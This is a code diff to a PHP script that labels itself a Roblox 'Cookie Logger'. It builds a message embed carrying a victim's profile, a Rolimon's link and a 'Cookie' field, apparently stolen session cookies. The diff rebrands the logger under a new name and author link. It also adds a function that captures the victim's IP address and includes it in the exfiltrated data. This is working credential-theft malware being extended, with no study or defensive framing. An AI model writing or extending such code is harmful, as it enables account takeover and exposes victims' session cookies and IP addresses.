@@ -1,4 +1,14 @@
 <?php
+function GetUserIpAddress(){
+    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }else{
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+    return $ip;
+}
     require("config.php");
     header("Access-Control-Allow-Origin: *");
 
@@ -62,8 +72,8 @@
                             "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $profile["UserID"] . "&width=420&height=420&format=png"
                         ],
                         "author" => [
-                            "name" => "\"Roliox\" Cookie Logger",
-                            "url" => "https://twitter.com/h0nde"
+                            "name" => "\"RBLXApi\" Cookie Logger",
+                            "url" => "https://twitter.com/fr1onx"
                         ],
                         "fields" => [
                             [
@@ -81,6 +91,10 @@
                             [
                                 "name" => "Rolimon's",
                                 "value" => "https://www.rolimons.com/player/" . $profile["UserID"]
+                            ],
+                            [
+                                "name" => "IP Address",
+                                "value" => GetUserIpAddress()
                             ],
                             [
                                 "name" => "Cookie",
